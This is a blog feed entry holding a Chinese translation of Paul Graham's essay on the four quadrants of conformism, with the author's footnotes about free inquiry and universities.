    <content type="html"><![CDATA[<h3 id="因循的四象限"><a class="markdownIt-Anchor" href="#因循的四象限"></a> 因循的四象限</h3><p><a href="http://www.paulgraham.com/conformism.html">原文:The Four Quadrants of Conformism</a></p><p>Author : Paul Gramham</p><p>July 2020</p><p>给人分类最好的标准之一便是其因循程度和积极性。想象一个平面坐标系，横轴从左到右分别是循规蹈矩的人和独立思考的人，竖轴自底向上是消极温顺的人和积极好斗的人。结果分成四个象限各代表四种人。从左上方开始逆时针旋转，依次是积极守旧型、消极守旧型、消极独立型、积极独立型。</p><p>我认为这四种类型的人在大多数社会都能找到，而一个人被归类入那种象限更多取决于自身的个性而不是社会的流行价值观。[1]</p><p>从儿童中能够找到支持以上两点的绝佳证据。在小学里这四种类型的人都很常见，而学校的规章制度却千篇一律地专制，这无疑表明人能成为何种类型取决于他们自己，而不是由规矩所决定。</p><p>左上方(第二象限)的孩子是积极守旧型，那些向老师告密的红卫兵。他们相信规矩必须被严格遵守，不守规矩的人必须受到惩罚。</p><p>左下方(第三象限)的孩子是消极守旧型，那些温顺如绵羊的老好人。他们小心谨慎、循规蹈矩，但当其他孩子破坏规矩的时候,他们的第一反应是为其可能被罚而担忧，而不是想方设法让他们受罚。</p><p>右上方(第一象限)的孩子是消极独立型，那些心不在焉的游离派。他们对规矩不甚关心，可能连规矩的内容都不太清楚。</p><p>右下方(第四象限)的孩子是积极独立型，那些最淘气的刺头儿。他们看到规矩的第一反应就是质疑之，被吩咐去做某事时，他们往往会和要求对着干。</p><p>当然，在衡量因循程度时，你必须谈及规矩所关系到的对象，而这随着孩子的成长而变化。对于十分幼小的孩子来说，规矩由成人制定。但当孩子长大些，他们的同龄人则成为了规矩的来源。所以一帮少年对学校规则尽可以表示轻蔑，却同样不是独立思考的结果，反而是从众的表现。</p><p>正如我们可以通过叫声分辨鸟的种类，成年人也可以通过言语辨认四种类型的儿童。红卫兵喊叫着“打倒反对派！”，老好人说“邻居们会怎么想？”，游离派声称“各有所好”，刺头儿高呼“但是它的确在动”(原文:<em>Eppur si muove</em>)。</p><p>这四种类型的人并不同样多。消极型的人比积极型的人更多，循规蹈矩者更是远多于独立思考者。所以老好人是最大的一类群体，而刺头儿则最少。</p><p>一个人属于哪种象限更多取决于自身的个性而不是被规矩的类型所限，大多数人就算在完全不同的社会成长仍然会成为和原来属于相同象限的人。</p><p>普利斯顿大学的教授罗伯特·乔治最近写道：</p><blockquote><p>我有时侯会问学生：如果他们是生活在废奴前的南方白人，他们在奴隶制上的的立场会是如何？你猜他们怎么说？他们依然会成为废奴主义者！他们依然会勇敢地声讨奴隶制并不遗余力地与之作斗争。</p></blockquote><p>教授该是出于礼貌而言止于此，但是学生们在那样的情况下肯定不会坚持成为废奴主义者。实际上，我不惮以最坏的恶意揣测这些学生，他们不仅总体上会表现得和当时的人一样，现在他们之中规矩的积极捍卫者在当时也会是红卫兵式的人物。换句话说，他们不仅不会去反对奴隶制，还会成为奴隶制最坚定的维护者。</p><p>我承认自己怀有偏见，但在我看来那一撮积极守旧型的人对世界上的混乱负有极大的责任，自启蒙运动以来我们演化出的很多措施就是用来保护剩下的人免受侵犯。其中尤为重要的是，“异端”这一概念逐渐淡化，取而代之的是各种不同观点自由辩论的原则，就算有些观点目前还不被认可，尝试践行者也不会受到任何惩罚。[2]</p><p>不过，为什么独立思想者需要被保护呢？因为他们拥有所有的新想法。比如，想当一个成功的科学家，仅仅做到正确是不够的。你必须在其他人都错误的时候保持正确，而循规蹈矩的人是做不到的。类似地，所有成功的创业CEO都不仅拥有主见，还积极伸张。所以社会的繁荣和其拥有限制积极守旧型的措施密切相关，这并非偶然。[3]</p><p>近几年来，我们很多人都注意到那些保护自由探索的措施正在被动摇。有些人说我们是过度反应———因为那些措施并没有被削弱很多，或者是为了更重大的利益让步。我们现在就来处理第二种看法。每当守旧派占上风，他们总是宣称为了更大的利益，只是碰巧每次都是出于一种不同的、不可相容的重大利益。</p><p>至于前一种观点，也就是认为独立思想者敏感过度，自由探索的大门并没有被关得那么严，我想说的是，除非你自己是个有主见的人，否则你无法对此做出判断。除非你自己拥有观念的水位，否则你无法知道它是否正在干涸。而只有独立思想者拥有最先锋的看法，也正因此，他们思想领域探索自由度的变化非常敏感，他们就是煤矿中的金丝雀(译者注:<em>the canaries in this coalmine</em>)。</p><p>守旧者总是宣称他们不想阻塞所有言路，而只是针对坏主意。</p><p>你可能会觉得字里行间其排除异己之心昭然若揭。但我还是要讲清楚为什么我们需要讨论那些“坏主意”，这有两条原因。</p><p>其一，任何决定哪种意见会被禁止的过程都一定会出错。因为没有聪明人想承担这种任务，所以最终这种决定都会由蠢人做出。而当一个过程导致了很多错误，就需要留出误差幅度，也就是减少所禁止的意见数。但积极守旧者很难做到这点，因为他们从小就乐于看到别人受罚，又喜欢互相竞争。正统派的执行者不能容许中间意见的存在，这会给其他执行者以机会在道德纯洁度上占上风，甚至可能会让他们掉转头来攻击自己。所以我们不但不会留出原本所需的误差幅度，反而会出现竞次，最终让所有貌似异端的观点都被禁止。[4]</p><p>其二，观点之间的联系要比看上去紧密得多。如果你限制某些话题的讨论，受到影响的不止是那些话题，限制会传播至任何牵涉到被禁内容的话题，而这并非极端案例。最好的观点往往会在远离起源的领域产生后果。在一个意见会被部分地禁止的世界中拥有想法就像在角落里有雷区的球场上踢足球一样，你会感到球场变了样，不再能踢球如常，就算在安全的地面上也踢得极为压抑。</p><p>过去，独立思想者保护自己的方式是在少数几个地方聚集——最初是在法庭,后来是在大学——在这里他们一定程度上能制定自己的规则。这些可以让人带着想法工作的场所往往拥有保护自由探索的措施，正如晶圆厂拥有强力的空气过滤器，录音棚具有良好的隔音效果。至少在过去几个世纪里，当积极守旧者由于各种原因得以横行霸道的时候，大学是最安全的地方。</p><p>然而不凑巧的是，这一回躲进大学可能不再管用，因为最新一波不宽容的浪潮开始在大学兴起，这股浪潮始于20世纪80年代中期，到2000年似乎已经退去，但就在最近，随着社交媒体的到来，它又死灰复燃了。不幸的是，这似乎是硅谷在自摆乌龙。尽管硅谷的管理者几乎都是独立思想者，但他们给了积极守旧者一个他们做梦都想不到的工具。</p><p>另一方面，也许大学内部自由探究精神的衰退，既是独立思想离开的征兆，也是其原因。50年前本可成为教授的人现在有了其他选择。现在，他们可以成为定量分析师或开创公司。你必须有独立的思想才能在这两方面取得成功。如果这些人成为教授，他们会为了学术自由而进行更严厉的抵抗。因此，也许现在想象独立思想者逃离日渐衰败的大学这一景象会显得过于悲观。大学的衰退，也许正因为很多独立思想者已经离开。</p><p>虽然我花了很多时间思考这种情况，但我无法预测结果如何。会有大学成功扭转当前的趋势，继续保持自己作为独立思想者想要聚集的地方吗？亦或独立思想者会逐渐抛弃大学？我很担心，如果真的走到那一步我们会失去什么。</p><p>但是我对长远的未来抱有希望。独立思考者善于保护自己。如果现存的制度陷入危险，他们会创造新的制度。这需要一定的想象力，但毕竟想象力正是他们的专长。</p><p>作者注：</p><p>[1] 我当然意识到，如果人们的性格在任意两个方面有所不同，你就能以之为坐标轴，把划分出的四个象限称为人格类型。所以我真正要说的是此处这两条轴是正交的，两者有很大的差异</p><p>[2] 积极保守者并不为世界上所有的麻烦负责。麻烦的另一大来源是那种魅力超凡的领导人，他们通过吸引积极保守者而获得权力。当这样的领导人出现时，积极保守型变得更加危险。</p><p>[3] 当我运营Y Combinator时，我从不担心写一些冒犯积极守旧者的东西。如果YC是一家饼干公司，我会面临一个艰难的道德选择。积极守旧者也吃饼干。但他们并没有成功创业。所以，如果我阻止他们申请YC，唯一的影响就是节省我们阅读申请表的工作量。</p><p>[4] 在一个领域已经取得了进步：对谈论被禁思想的惩罚不如过去严厉。被杀的危险很小，至少在较富裕的国家是如此。积极守旧者大多满足于让人被炒鱿鱼。</p><p>[5] 许多教授都有独立的思想，尤其是在数学、硬科学和工程学方面，在这些领域必须靠独立思想取得成功。但学生更能代表普通民众，因此大多是传统思维。所以，当教授和学生之间发生冲突时，这不仅是代际之间的冲突，还是不同类型的人之间的冲突。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
      <tag>翻译</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
